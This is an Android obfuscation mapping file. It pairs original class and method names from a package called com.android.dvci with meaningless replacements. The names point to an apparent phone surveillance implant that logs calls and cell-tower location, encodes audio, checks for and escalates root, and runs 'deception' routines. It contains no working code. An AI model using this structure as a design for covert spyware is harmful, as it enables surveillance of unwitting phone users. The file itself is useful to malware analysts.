android.media.AmrInputStream -> android.media.AmrInputStream:
    java.lang.String TAG -> TAG
    int SAMPLES_PER_FRAME -> SAMPLES_PER_FRAME
    java.io.InputStream mInputStream -> mInputStream
    int mGae -> mGae
    byte[] mBuf -> mBuf
    int mBufIn -> mBufIn
    int mBufOut -> mBufOut
    byte[] mOneByte -> mOneByte
    48:49:int read() -> read
    54:54:int read(byte[]) -> read
    59:83:int read(byte[],int,int) -> read
    89:101:void close() -> close
    106:110:void finalize() -> finalize
    int GsmAmrEncoderNew() -> GsmAmrEncoderNew
    void GsmAmrEncoderInitialize(int) -> GsmAmrEncoderInitialize
    int GsmAmrEncoderEncode(int,byte[],int,byte[],int) -> GsmAmrEncoderEncode
    void GsmAmrEncoderCleanup(int) -> GsmAmrEncoderCleanup
    void GsmAmrEncoderDelete(int) -> GsmAmrEncoderDelete
com.android.dvci.Ac -> stt.Code:
    boolean status -> Code
    boolean sentInfo -> localvar
    20:20:boolean getStatus() -> Code
    63:82:void playTone(int) -> Code
    86:93:void vibrate() -> localvar
    96:99:void bip() -> localclass
    102:105:void beep() -> instance
    116:120:void beepPenta() -> inst
    123:126:void beepExit() -> variables
    127:187:boolean checkRoot() -> mylist
    191:205:boolean hasSu() -> myarray
    214:251:boolean checkRootPackages() -> invoked
    258:264:boolean checkDebugBuild() -> zygoteapp
    268:319:boolean removeOldInstall(java.lang.String) -> Code
    323:375:boolean upgradeRoot() -> zygotevar
    34:34:byte[] getBytes(java.lang.String) -> getBytes
    48:86:byte[] getBytes(java.lang.String,boolean) -> Code
    98:110:byte[] pascalize(byte[]) -> Code
    123:123:java.lang.String getString$5a238448(byte[]) -> localvar
    140:169:java.lang.String getString$20e7da8$489d23ed(byte[],int) -> Code
    188:195:java.lang.String readPascal(com.android.dvci.util.DataBuffer) -> Code
    206:206:byte[] pascalize(java.lang.String) -> localvar
com.android.dvci.BM -> com.android.dvci.BM:
    32:34:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.dvci.Battery -> stt.localvar:
    int level -> level
    int scale -> localclass
    int temperature -> instance
    int voltage -> inst
    23:23:int getBatteryLevel() -> zygoteclass
    46:84:void statusActions() -> mymethod
    90:115:void statusModules() -> myclass
    121:146:void statusEvents() -> myvar
    152:170:void statusGlobals() -> sort
com.android.dvci.Call -> stt.localclass:
    java.lang.String number -> variables
    boolean incoming -> mylist
    boolean ongoing -> myarray
    boolean complete -> invoked
    java.util.Date timeBegin -> zygoteapp
    java.util.Date timeEnd -> zygotevar
    boolean offhook -> zygoteclass
    java.lang.String newState -> mymethod
    java.lang.String oldState -> myclass
    47:47:java.lang.String getNumber() -> quicksort
    51:54:java.lang.String getFrom() -> evaluate
    59:62:java.lang.String getTo() -> getTo
    67:67:boolean isIncoming() -> eval
    71:71:boolean isOngoing() -> fingerprint
    75:75:java.util.Date getTimeBegin() -> openfile
    79:79:java.util.Date getTimeEnd() -> closefile
    87:92:void setComplete(boolean) -> Code
    95:96:void setOngoing(boolean) -> localvar
    106:111:int getDuration() -> getDuration
    117:117:java.lang.String toString() -> toString
    123:123:boolean isOffhook() -> constants
    127:128:void setOffhook() -> globalize
    131:134:boolean changedState() -> main
com.android.dvci.CellInfo -> stt.instance:
    int mcc -> mcc
    int mnc -> mnc
    int lac -> myvar
    int cid -> sort
    int sid -> quicksort
    int nid -> evaluate
    int bid -> eval
    int rssi -> fingerprint
    boolean valid -> openfile
    boolean gsm -> closefile
    boolean cdma -> constants
    30:44:void setGsm$2e715812(int,int,int,int) -> Code
    47:64:void setCdma$3b4dfe4b(int,int,int) -> Code
    69:84:java.lang.String toString() -> toString
com.android.dvci.Connectivity -> stt.inst:
    boolean connected -> connected
    20:20:boolean isConnected() -> isConnected
    27:37:byte[] SHA1$7dcc7401(byte[],int) -> localvar
    56:66:byte[] MD5$7dcc7401(byte[],int) -> localclass
    77:77:byte[] SHA1(byte[]) -> localclass
    81:81:java.lang.String SHA1(java.lang.String) -> localclass
    92:92:byte[] MD5(byte[]) -> instance
    96:96:java.lang.String MD5(java.lang.String) -> instance
    106:109:long CRC32(byte[]) -> inst
com.android.dvci.Core -> stt.variables:
    boolean serviceRunning -> globalize
    boolean bStopCore -> main
    java.lang.Thread coreThread -> lua
    android.content.ContentResolver contentResolver -> lua_main
    com.android.dvci.manager.ManagerModule moduleManager -> lua_and
    com.android.dvci.manager.ManagerEvent eventManager -> lua_break
    java.lang.Thread fastQueueThread -> lua_do
    com.android.dvci.Core$CheckAction checkActionFast -> lua_else
    android.app.PendingIntent alarmIntent -> lua_elseif
    com.android.dvci.ServiceMain serviceMain -> lua_end
    com.android.dvci.Core singleton -> lua_false
    96:100:com.android.dvci.Core self() -> lua
    107:110:void serivceUnregister() -> lua_main
    113:119:com.android.dvci.Core newCore(com.android.dvci.ServiceMain) -> Code
    134:246:boolean Start(android.content.res.Resources,android.content.ContentResolver) -> Code
    250:252:void deceptionCode2(long) -> Code
    255:257:void deceptionCode1() -> lua_and
    265:276:boolean Stop() -> lua_break
    284:284:boolean iSR() -> iSR
    299:405:void run() -> run
    409:414:boolean checkActions() -> lua_do
    440:520:boolean checkActions(int) -> localvar
    529:561:void stopAll() -> lua_else
    572:655:int taskInit() -> lua_elseif
    660:667:boolean verifyNewConf() -> lua_end
    678:775:int loadConf() -> lua_false
    779:809:boolean loadConfFile(com.android.dvci.file.AutoFile,boolean) -> Code
    820:891:int executeAction$49539c68(com.android.dvci.action.Action,com.android.dvci.Trigger) -> Code
    920:940:boolean reloadConf() -> lua_for
    950:973:boolean check() -> lua_function
    979:991:boolean checkStatic() -> lua_if
    996:1000:boolean haveUninstallMarkup() -> lua_in
    1007:1009:void createUninstallMarkup() -> lua_local
    47:47:boolean access$000(com.android.dvci.Core,int) -> Code
com.android.dvci.Core$1 -> stt.mylist:
    com.android.dvci.Core this$0 -> lua_for
    158:159:void run() -> run
com.android.dvci.Core$CheckAction -> stt.variables$Code:
    int queue -> lua_function
